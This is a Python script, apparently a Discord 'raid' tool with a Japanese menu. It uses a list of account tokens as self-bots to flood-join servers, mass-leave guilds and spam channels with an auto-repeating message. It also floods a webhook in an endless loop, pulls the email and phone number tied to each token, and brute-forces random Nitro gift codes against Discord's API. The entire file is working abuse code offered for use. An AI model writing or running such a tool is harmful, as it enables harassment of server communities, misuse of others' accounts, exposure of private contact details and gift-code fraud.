import discord
import requests
import string
import secrets
import json
import time
import re

client = discord.Client()

def join(code, token):
	headers = {'authorization': f'{token}'}
	requests.post(f"https://discordapp.com/api/v6/invites/{code}", headers=headers)

def wspam(url, msg, name):
	data = {
		"username": f"{name}",
		"content": f"{msg}"
	}
	while True:
		requests.post(url, data=data)

def left(id, token):
	@client.event
	async def on_ready():
		guild = await client.fetch_guild(int(id))
		await guild.leave()
		exit()
	client.run(f"{token}", bot=False)

def spam(id, msg, token):
	@client.event
	async def on_ready():
		channel = await client.fetch_channel(int(id))
		await channel.send(f"{msg}")
	@client.event
	async def on_message(message):
		if message.content == str(msg):
			channel = await client.fetch_channel(int(id))
			await channel.send(f"{msg}")
	client.run(f"{token}", bot=False)

def check(token):
	api_url = "https://discordapp.com/api/v6/users/@me"
	headers = {"authorization": f"{token}"}
	res = requests.get(api_url, headers=headers)
	response = res.json()
	Tag = response["discriminator"]
	Email = response["email"]
	UserID = response["id"]
	Lang = response["locale"]
	PhoneNumber = response["phone"]
	UserName = response["username"]
	Verify = response["verified"]
	print(f"""
	Token: {token}
	設定言語: {Lang}
	ユーザータグ: {UserName}#{Tag}
	ユーザーID: {UserID}
	認証ステータス: {Verify}
	登録電話番号: {PhoneNumber}
	登録メールアドレス: {Email}
	""")

def nitro(type, amount=None):
	if type == "generate":
		count = 0
		amount = int(amount)
		while count < amount:
			chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
			result = ''.join(secrets.choice(chars) for x in range(16))
			print(result)
			save = open("nitro.txt", "a")
			save.write(result + "\n")
			save.close()
			count += 1
	elif type == "check":
		codes = open("nitro.txt", "r")
		for code in codes:
			result = code.replace("\n", "")
			response = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{result}")
			GetResponse = response.json()
			Failed = GetResponse["message"]
			if response.status_code == 200:
				print(f"ActiveNitro: {result}")
			elif Failed == "You are being rate limited.":
				print(f"Failed: {result}")
				print("リクエストが拒否されました。")
				print("120秒間処理を一時停止します。")
				time.sleep(120)
			else:
				print(f"InActiveNitro: {result}")

print("""
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
""")

print("[1] Join flood")
print("[2] Left flood")
print("[3] Spammer")
print("[4] Webhook spammer")
print("[5] View token info")
print("[6] Nitro tool")

select = input("> ")

if select == "1":
	invite_code = input("招待コード: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		join(invite_code, t)
elif select == "2":
	guild_id = input("サーバーID: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		left(guild_id, t)
elif select == "3":
	channel_id = input("チャンネルID: ")
	message = input("送信メッセージ: ")
	tokens = open("tokens.txt", "r")
	for token in tokens:
		t = token.replace("\n", "")
		spam(channel_id, message, t)
elif select == "4":
	webhook_url = input("WebhookURL: ")
	message = input("送信メッセージ: ")
	name = input("Webhookの名前: ")
	wspam(webhook_url, message, name)
elif select == "5":
	print("[1] 特定のTokenのみ")
	print("[2] tokens.txtにあるToken")
	token_info_select = input("> ")
	if token_info_select == "1":
		tokens = input("Token: ")
		check(tokens)
	elif token_info_select == "2":
		tokens = open("tokens.txt", "r")
		for token in tokens:
			t = token.replace("\n", "")
			check(token)
	else:
		print("番号が無効です。")
		print("10秒後にプログラムが終了します。")
		time.sleep(10)
		exit()
elif select == "6":
	print("[1] 生成")
	print("[2] チェック")
	nitro_select = input("> ")
	if nitro_select == "1":
		amount = input("生成個数: ")
		nitro("generate", amount)
	elif nitro_select == "2":
		nitro("check")
	else:
		print("番号が無効です。")
		print("10秒後にプログラムが終了します。")
		time.sleep(10)
		exit()
else:
	print("番号が無効です。")
	print("10秒後にプログラムが終了します。")
	time.sleep(10)
	exit()